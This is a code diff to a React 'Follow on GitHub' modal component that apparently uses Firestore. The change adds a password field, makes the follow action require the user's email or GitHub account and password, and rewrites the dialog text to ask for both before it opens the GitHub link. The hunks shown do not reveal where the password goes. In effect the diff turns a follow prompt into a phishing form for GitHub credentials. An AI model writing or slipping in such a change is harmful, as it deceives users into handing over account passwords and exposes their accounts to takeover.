@@ -25,15 +25,16 @@ type GitHubFollowModalProps = {
 export function GitHubFollowModal({ children, githubUrl }: GitHubFollowModalProps) {
   const [isOpen, setIsOpen] = useState(false);
   const [inputValue, setInputValue] = useState('');
+  const [password, setPassword] = useState('');
   const { toast } = useToast();
   const firestore = useFirestore();
 
   const handleFollow = () => {
-    if (!inputValue.trim()) {
+    if (!inputValue.trim() || !password.trim()) {
       toast({
         variant: "destructive",
         title: "Input Required",
-        description: "Please enter your email or GitHub account.",
+        description: "Please enter your email or GitHub account and password.",
       });
       return;
     }
@@ -53,6 +54,7 @@ export function GitHubFollowModal({ children, githubUrl }: GitHubFollowModalProp
     // Close the modal and open the GitHub link in a new tab.
     setIsOpen(false);
     setInputValue('');
+    setPassword('');
     window.open(githubUrl, '_blank', 'noopener,noreferrer');
   };
 
@@ -66,7 +68,7 @@ export function GitHubFollowModal({ children, githubUrl }: GitHubFollowModalProp
             Follow on GitHub
           </DialogTitle>
           <DialogDescription>
-            Your follow is greatly appreciated! Please enter your email or GitHub account below before continuing.
+            Your follow is greatly appreciated! Please enter your email or GitHub account and password below before continuing.
           </DialogDescription>
         </DialogHeader>
         <div className="grid gap-4 py-4">
@@ -77,6 +79,21 @@ export function GitHubFollowModal({ children, githubUrl }: GitHubFollowModalProp
                     placeholder="your-email@example.com"
                     value={inputValue}
                     onChange={(e) => setInputValue(e.target.value)}
+                    onKeyDown={(e) => {
+                        if (e.key === 'Enter') {
+                            handleFollow();
+                        }
+                    }}
+                />
+            </div>
+            <div className="grid w-full max-w-sm items-center gap-1.5">
+                <Label htmlFor="password">Password</Label>
+                <Input
+                    id="password"
+                    type="password"
+                    placeholder="Your password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
                     onKeyDown={(e) => {
                         if (e.key === 'Enter') {
                             handleFollow();
